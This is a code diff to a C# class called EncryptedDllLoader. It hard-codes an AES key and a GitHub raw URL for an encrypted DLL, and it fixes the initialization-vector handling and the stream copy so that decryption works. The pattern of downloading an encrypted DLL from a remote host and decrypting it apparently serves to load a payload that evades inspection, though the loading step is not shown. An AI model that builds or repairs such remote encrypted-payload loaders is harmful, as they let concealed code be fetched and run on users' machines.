@@ -10,7 +10,7 @@ using System.Threading;
 public class EncryptedDllLoader
 {
     private static readonly string Key = "70ebd74adcc74271"; // Replace with a strong secret key
-    private static readonly string IV = "userthreadingmainfunction"; // Replace with a strong initialization vector
+    private static readonly byte[] IV = Encoding.UTF8.GetBytes("1234567890123456"); // Replace with a strong initialization vector
 
     private static readonly string DllUrl = "https://raw.githubusercontent.com/99119240/Methods/main/dll/gui.dll.encrypted"; // Replace with the actual URL
 
@@ -59,12 +59,12 @@ public class EncryptedDllLoader
         }
     }
 
-    private static byte[] Decrypt(byte[] encryptedData, string key, string iv)
+    private static byte[] Decrypt(byte[] encryptedData, string key, byte[] iv)
     {
         using (Aes aesAlg = Aes.Create())
         {
             aesAlg.Key = Encoding.UTF8.GetBytes(key);
-            aesAlg.IV = Encoding.UTF8.GetBytes(iv);
+            aesAlg.IV = iv;
 
             ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
@@ -72,10 +72,15 @@ public class EncryptedDllLoader
             {
                 using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                 {
-                    using (MemoryStream ms = new MemoryStream())
+                    using (MemoryStream resultStream = new MemoryStream())
                     {
-                        csDecrypt.CopyTo(ms);
-                        return ms.ToArray();
+                        byte[] buffer = new byte[1024];
+                        int bytesRead;
+                        while ((bytesRead = csDecrypt.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            resultStream.Write(buffer, 0, bytesRead);
+                        }
+                        return resultStream.ToArray();
                     }
                 }
             }
